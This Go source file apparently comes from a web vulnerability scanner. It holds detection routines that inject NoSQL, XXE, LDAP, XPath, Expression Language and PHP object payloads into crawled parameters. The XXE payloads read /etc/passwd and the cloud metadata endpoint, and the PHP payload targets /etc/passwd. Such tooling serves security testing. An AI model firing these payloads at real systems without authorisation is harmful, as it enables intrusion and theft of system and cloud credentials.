package scanner

import (
	"fmt"
	"strings"
	"sync"

	"github.com/zanicool/apex-cli/pkg/crawler"
	"github.com/zanicool/apex-cli/pkg/engine"
	"github.com/zanicool/apex-cli/pkg/oob"
)

// --- NoSQL Injection ---

var nosqlPayloads = []struct {
	payload string
	detect  string
}{
	{`{"$gt":""}`, ""},
	{`{"$ne":"invalid"}`, ""},
	{`' || '1'=='1`, ""},
	{`{"$regex":".*"}`, ""},
	{`{"$where":"sleep(3000)"}`, ""},
	{`[$ne]=1`, ""},
	{`[$gt]=`, ""},
	{`[$regex]=.*`, ""},
}

func scanNoSQL(cfg *engine.Config, http *engine.HTTPClient, crawl *crawler.Result, _ *oob.Client) []Finding {
	var findings []Finding
	var mu sync.Mutex
	sem := make(chan struct{}, cfg.Threads)
	var wg sync.WaitGroup

	for u, params := range crawl.Params {
		for _, p := range params {
			wg.Add(1)
			go func(baseURL, param string) {
				defer wg.Done()
				sem <- struct{}{}
				defer func() { <-sem }()

				// Get baseline
				baseResp := http.Get(baseURL)
				if baseResp.Err != nil {
					return
				}

				// Test $ne bypass (returns data when it shouldn't)
				testURL := injectParam(baseURL, param, `{"$ne":""}`)
				resp := http.Get(testURL)
				if resp.Err == nil && resp.StatusCode == 200 &&
					len(resp.Body) > len(baseResp.Body)+50 {
					mu.Lock()
					findings = append(findings, Finding{
						Type: "NoSQL Injection ($ne bypass)", Severity: "critical",
						URL: testURL, Param: param, Payload: `{"$ne":""}`,
						Detail: "NoSQL $ne operator returned extra data — auth bypass possible",
						Template: "apex-nosql",
					})
					mu.Unlock()
					return
				}

				// Test $regex
				testURL = injectParam(baseURL, param+"[$ne]", "invalid")
				resp = http.Get(testURL)
				if resp.Err == nil && resp.StatusCode == 200 && resp.Body != baseResp.Body {
					mu.Lock()
					findings = append(findings, Finding{
						Type: "NoSQL Injection (operator injection)", Severity: "high",
						URL: testURL, Param: param, Payload: param + "[$ne]=invalid",
						Template: "apex-nosql-operator",
					})
					mu.Unlock()
				}
			}(u, p)
		}
	}
	wg.Wait()
	return findings
}

// --- XXE Injection ---

func scanXXE(cfg *engine.Config, http *engine.HTTPClient, crawl *crawler.Result, oobClient *oob.Client) []Finding {
	var findings []Finding

	xxePayloads := []struct {
		payload string
		detect  string
	}{
		{`<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>`, "root:x:0"},
		{`<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><foo>&xxe;</foo>`, ""},
		{`<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>`, "ami-id"},
	}

	// Find XML-accepting endpoints
	xmlEndpoints := []string{}
	for _, form := range crawl.Forms {
		xmlEndpoints = append(xmlEndpoints, form.Action)
	}
	for _, page := range crawl.Pages[:min(20, len(crawl.Pages))] {
		xmlEndpoints = append(xmlEndpoints, page.URL)
	}

	for _, endpoint := range xmlEndpoints[:min(30, len(xmlEndpoints))] {
		for _, xxe := range xxePayloads {
			resp := http.Post(endpoint, "application/xml", xxe.payload)
			if resp.Err != nil {
				continue
			}
			if xxe.detect != "" && strings.Contains(resp.Body, xxe.detect) {
				findings = append(findings, Finding{
					Type: "XML External Entity (XXE) Injection", Severity: "critical",
					URL: endpoint, Payload: xxe.payload[:80],
					Detail:   fmt.Sprintf("XXE confirmed — file read successful. Evidence: %s", xxe.detect),
					Template: "apex-xxe",
				})
				break
			}
			// Also try JSON content-type with XML body (content-type confusion)
			resp2 := http.Post(endpoint, "text/xml", xxe.payload)
			if resp2.Err == nil && xxe.detect != "" && strings.Contains(resp2.Body, xxe.detect) {
				findings = append(findings, Finding{
					Type: "XXE via Content-Type Confusion", Severity: "critical",
					URL: endpoint, Payload: xxe.payload[:80],
					Template: "apex-xxe-ct",
				})
				break
			}
		}
	}
	return findings
}

// --- LDAP Injection ---

func scanLDAP(cfg *engine.Config, http *engine.HTTPClient, crawl *crawler.Result, _ *oob.Client) []Finding {
	var findings []Finding
	ldapPayloads := []struct{ payload, detect string }{
		{"*)(uid=*))(|(uid=*", "ldap"},
		{"admin)(&)", "error"},
		{"*)(objectClass=*", "objectclass"},
		{")(cn=*", "cn="},
	}

	for u, params := range crawl.Params {
		for _, p := range params {
			if !strings.Contains(strings.ToLower(p), "user") &&
				!strings.Contains(strings.ToLower(p), "name") &&
				!strings.Contains(strings.ToLower(p), "search") &&
				!strings.Contains(strings.ToLower(p), "query") {
				continue
			}
			for _, pl := range ldapPayloads {
				testURL := injectParam(u, p, pl.payload)
				resp := http.Get(testURL)
				if resp.Err == nil && strings.Contains(strings.ToLower(resp.Body), pl.detect) {
					findings = append(findings, Finding{
						Type: "LDAP Injection", Severity: "high",
						URL: testURL, Param: p, Payload: pl.payload,
						Template: "apex-ldap",
					})
					break
				}
			}
		}
	}
	return findings
}

// --- XPath Injection ---

func scanXPath(cfg *engine.Config, http *engine.HTTPClient, crawl *crawler.Result, _ *oob.Client) []Finding {
	var findings []Finding
	xpathPayloads := []struct{ payload, detect string }{
		{"' or '1'='1", "xpath"},
		{"1' and '1'='1", ""},
		{"' or count(//*)>0 or '1'='1", ""},
		{"'] | //user/*[contains(*,'", "xpath"},
	}

	for u, params := range crawl.Params {
		for _, p := range params {
			for _, pl := range xpathPayloads {
				testURL := injectParam(u, p, pl.payload)
				resp := http.Get(testURL)
				if resp.Err != nil {
					continue
				}
				if pl.detect != "" && strings.Contains(strings.ToLower(resp.Body), pl.detect) {
					findings = append(findings, Finding{
						Type: "XPath Injection", Severity: "high",
						URL: testURL, Param: p, Payload: pl.payload,
						Template: "apex-xpath",
					})
					break
				}
			}
		}
	}
	return findings
}

// --- Expression Language Injection ---

func scanELInjection(cfg *engine.Config, http *engine.HTTPClient, crawl *crawler.Result, _ *oob.Client) []Finding {
	var findings []Finding
	elPayloads := []struct{ payload, detect string }{
		{"${7*7}", "49"},
		{"#{7*7}", "49"},
		{"${T(java.lang.Runtime).getRuntime()}", "java.lang.Runtime"},
		{"${applicationScope}", "javax.servlet"},
		{"#{request.getClass()}", "class"},
	}

	for u, params := range crawl.Params {
		// Baseline check
		baseResp := http.Get(u)
		for _, p := range params {
			for _, pl := range elPayloads {
				if baseResp.Err == nil && strings.Contains(baseResp.Body, pl.detect) {
					continue // Already in baseline = false positive
				}
				testURL := injectParam(u, p, pl.payload)
				resp := http.Get(testURL)
				if resp.Err == nil && strings.Contains(resp.Body, pl.detect) {
					findings = append(findings, Finding{
						Type: "Expression Language (EL) Injection", Severity: "critical",
						URL: testURL, Param: p, Payload: pl.payload,
						Evidence: pl.detect, Template: "apex-el-injection",
					})
					break
				}
			}
		}
	}
	return findings
}

// --- PHP Object Injection ---

func scanPHPObjectInjection(cfg *engine.Config, http *engine.HTTPClient, crawl *crawler.Result, _ *oob.Client) []Finding {
	var findings []Finding
	// PHP serialized object payloads
	phpPayloads := []struct{ payload, detect string }{
		{`O:8:"stdClass":0:{}`, ""},
		{`a:1:{s:4:"test";s:4:"test";}`, ""},
		{`O:7:"Example":1:{s:4:"file";s:11:"/etc/passwd";}`, "root:x:0"},
	}

	for u, params := range crawl.Params {
		for _, p := range params {
			for _, pl := range phpPayloads {
				testURL := injectParam(u, p, pl.payload)
				resp := http.Get(testURL)
				if resp.Err != nil {
					continue
				}
				// Detect PHP unserialization errors or successful exploitation
				if strings.Contains(resp.Body, "unserialize()") ||
					strings.Contains(resp.Body, "__wakeup") ||
					strings.Contains(resp.Body, "__destruct") ||
					(pl.detect != "" && strings.Contains(resp.Body, pl.detect)) {
					findings = append(findings, Finding{
						Type: "PHP Object Injection", Severity: "critical",
						URL: testURL, Param: p, Payload: pl.payload,
						Detail:   "Server processes serialized PHP objects — RCE via gadget chains possible",
						Template: "apex-php-object",
					})
					break
				}
			}
		}
	}
	return findings
}
